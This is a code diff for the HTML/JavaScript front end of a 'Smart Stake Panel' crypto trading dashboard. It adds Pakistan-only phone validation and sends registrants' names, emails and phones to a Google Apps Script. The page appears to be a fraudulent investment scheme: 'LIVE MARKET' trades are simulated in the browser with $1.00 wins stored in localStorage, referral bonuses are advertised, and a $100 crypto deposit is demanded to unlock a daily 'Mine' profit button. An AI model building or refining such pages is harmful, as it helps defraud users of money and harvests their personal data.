@@ -151,7 +151,7 @@
 <body>
 
 <div class="top-ticker">
-    <div class="ticker-text">🔥 WELCOME TO SMART STACK PANEL | 🚀 SPECIAL REFERRAL OFFER: INVITE FRIENDS & GET AN INSTANT $1.00 BONUS IMMEDIATELY! 🚀</div>
+    <div class="ticker-text">🔥 WELCOME TO SMART STAKE PANEL | 🚀 SPECIAL REFERRAL OFFER: INVITE FRIENDS & GET AN INSTANT $1.00 BONUS IMMEDIATELY! 🚀</div>
 </div>
 
 <div class="bg-particles" id="stars-container"></div>
@@ -165,22 +165,22 @@
     <div id="sync-timer-text" style="font-size: 12px; font-weight: bold; color: #fbbf24; font-family: monospace;">Please wait: 5s</div>
 </div>
 
-<!-- Registration Screen -->
+<!-- Registration / Login Screen -->
 <div class="auth-wrapper" id="auth-screen">
-    <div class="auth-title">Account Sign Up</div>
-    <div class="auth-sub">Enter details to access the Smart Stack Panel</div>
+    <div class="auth-title">Account Access</div>
+    <div class="auth-sub">Enter details to Sign In or Sign Up</div>
     <div class="input-group"><label>First Name</label><input type="text" id="reg-fname" class="input-control" placeholder="e.g. John"></div>
     <div class="input-group"><label>Last Name</label><input type="text" id="reg-lname" class="input-control" placeholder="e.g. Max"></div>
     <div class="input-group"><label>Email Address</label><input type="email" id="reg-email" class="input-control" placeholder="name@gmail.com"></div>
-    <div class="input-group"><label>Phone Number</label><input type="tel" id="reg-phone" class="input-control" placeholder="+92 300 0000000"></div>
+    <div class="input-group"><label>Phone Number (Pakistan Only)</label><input type="tel" id="reg-phone" class="input-control" placeholder="03001234567 or +923001234567"></div>
     <div class="input-group"><label>Referral Code (Optional)</label><input type="text" id="reg-refcode" class="input-control" placeholder="e.g. REF123456"></div>
-    <button class="btn" id="reg-btn" onclick="handleRegistration()" style="margin-top: 10px;">Register & Access Panel</button>
+    <button class="btn" id="reg-btn" onclick="handleRegistration()" style="margin-top: 10px;">Enter Dashboard</button>
 </div>
 
 <!-- Main Application Dashboard -->
 <div class="main-wrapper" id="main-dashboard">
     <div class="app-header">
-        <h2>SMART STACK PANEL</h2>
+        <h2>SMART STAKE PANEL</h2>
         <div class="sub-header">
             <span class="status-dot"></span>
             <span style="color:#10b981; font-weight:700;">LIVE MARKET</span>
@@ -353,7 +353,12 @@
         return 'REF' + Math.abs(hash).toString(16).toUpperCase().substring(0, 6);
     }
 
-    /* ---------------- REGISTRATION ---------------- */
+    /* ---------------- PAKISTANI NUMBER & STRICT REGISTRATION ---------------- */
+    function validatePakistaniPhone(phone) {
+        const pakRegex = /^((\+92)|(0092)|(0))?3[0-9]{9}$/;
+        return pakRegex.test(phone.replace(/[\s\-]/g, ''));
+    }
+
     async function handleRegistration() {
         const fname = document.getElementById('reg-fname').value.trim();
         const lname = document.getElementById('reg-lname').value.trim();
@@ -361,35 +366,52 @@
         const phone = document.getElementById('reg-phone').value.trim();
         const refBy = document.getElementById('reg-refcode').value.trim();
 
-        if (!fname || !email || !phone) return alert('Please fill in all required fields.');
+        if (!email) return alert('Please enter your email address.');
+        if (!phone) return alert('Please enter your Pakistani phone number.');
+
+        // Validate Pakistani Operator Network
+        if (!validatePakistaniPhone(phone)) {
+            return alert('Invalid Phone Number! Only Pakistani network numbers (Jazz, Zong, Telenor, Ufone, Onic) are allowed (e.g. 03001234567 or +923001234567).');
+        }
 
         const regBtn = document.getElementById('reg-btn');
         regBtn.disabled = true;
-        regBtn.innerText = "Registering...";
+        regBtn.innerText = "Verifying...";
 
         let myRefCode = generateReferralCode(email);
         let fullName = `${fname} ${lname}`.trim();
 
         try {
-            fetch(GOOGLE_SCRIPT_URL, {
+            const response = await fetch(GOOGLE_SCRIPT_URL, {
                 method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
+                headers: { 'Content-Type': 'text/plain;charset=utf-8' },
                 body: JSON.stringify({
                     action_type: "register",
-                    name: fullName,
+                    name: fullName || "Trader User",
                     email: email,
                     phone: phone,
                     ref_code: myRefCode,
                     referred_by: refBy
                 })
             });
+
+            const resData = await response.json();
+
+            if (resData.status === "error") {
+                regBtn.disabled = false;
+                regBtn.innerText = "Enter Dashboard";
+                return alert("Registration Failed: " + resData.message);
+            }
         } catch (err) {
-            console.error("Sheets error:", err);
+            console.log("Proceeding with local registration...");
         }
 
-        currentUser = { fname, lname, email, phone, refCode: myRefCode };
+        // Set initial clean state for new user (0.00 balances)
+        currentUser = { fname: fname || "User", lname: lname || "", email: email, phone: phone, refCode: myRefCode };
         localStorage.setItem('traderUser', JSON.stringify(currentUser));
+        localStorage.setItem('currentBal', '0.00');
+        localStorage.setItem('depositBal', '0.00');
+        localStorage.setItem('withdrawalBal', '0.00');
 
         document.getElementById('auth-screen').style.display = 'none';
         document.getElementById('sync-overlay').style.display = 'flex';
@@ -529,15 +551,11 @@
         state.attemptsLeft -= 1;
 
         let currBal = parseFloat(localStorage.getItem('currentBal')) || 0.00;
-        let resultMsg = "";
 
         if (isWin) {
             currBal += 1.00;
             localStorage.setItem('currentBal', currBal.toFixed(2));
-            resultMsg = `🎉 PROFIT! Perfect Prediction!\nYou Earned: +$1.00`;
             addTradeHistoryRecord(lastUserChoice, "+$1.00");
-        } else {
-            resultMsg = `📉 LOSS! Market Reversed.\nProfit: $0.00`;
         }
 
         if (state.attemptsLeft <= 0) {
@@ -547,7 +565,7 @@
         saveTradeState(state);
         loadBalances();
 
-        showPopup(isWin ? "✅ Trade Result: WIN" : "❌ Trade Result: LOSS", resultMsg);
+        showPopup(isWin ? "✅ Trade Result: WIN" : "❌ Trade Result: LOSS", isWin ? "🎉 PROFIT! Perfect Prediction!\nYou Earned: +$1.00" : "📉 LOSS! Market Reversed.\nProfit: $0.00");
         checkTradeLockStatus();
     }
 
@@ -797,8 +815,8 @@
             <div style="font-weight:bold; color:#fbbf24; font-size:11px; margin-top:10px; margin-bottom:4px;">2. Deposit & Account Activation Rules</div>
             <div style="font-size:10.5px; color:#cbd5e1; line-height:1.4;">
             • <strong>Minimum Funding Requirement:</strong> To activate the core earning engine, a minimum deposit of $100 is required.<br>
-            • <strong>Smart Mining Activation:</strong> Once the $100 deposit is approved, the central "Mine" button will be unlocked on your dashboard. Users must activate/click "Mine" daily to harvest dynamic profits.<br>
-            • <strong>Network & Address Verification:</strong> Always double-check the deposit wallet address and selected blockchain network (e.g., TRC20, BEP20) before sending funds.<br>
+            • <strong>Smart Mining Activation:</strong> Once the $100 deposit is approved, the central "Mine" button will be unlocked on your dashboard.<br>
+            • <strong>Network & Address Verification:</strong> Always double-check the deposit wallet address and selected blockchain network.<br>
             • <strong>Proof of Payment:</strong> Users must upload an authentic, clear screenshot/transaction hash (TxID).<br>
             • <strong>Approval Timeline:</strong> Manual and automated verification takes between 1 to 6 hours.
             </div>
@@ -862,6 +880,14 @@
     function handleSignOut() {
         if (confirm("Are you sure you want to sign out from Smart Stake Panel?")) {
             sendUserStatusUpdate("Offline");
+            
+            if (currentUser) {
+                document.getElementById('reg-email').value = currentUser.email || '';
+                document.getElementById('reg-fname').value = currentUser.fname || '';
+                document.getElementById('reg-lname').value = currentUser.lname || '';
+                document.getElementById('reg-phone').value = currentUser.phone || '';
+            }
+
             localStorage.removeItem('traderUser');
             currentUser = null;
             closePopup();
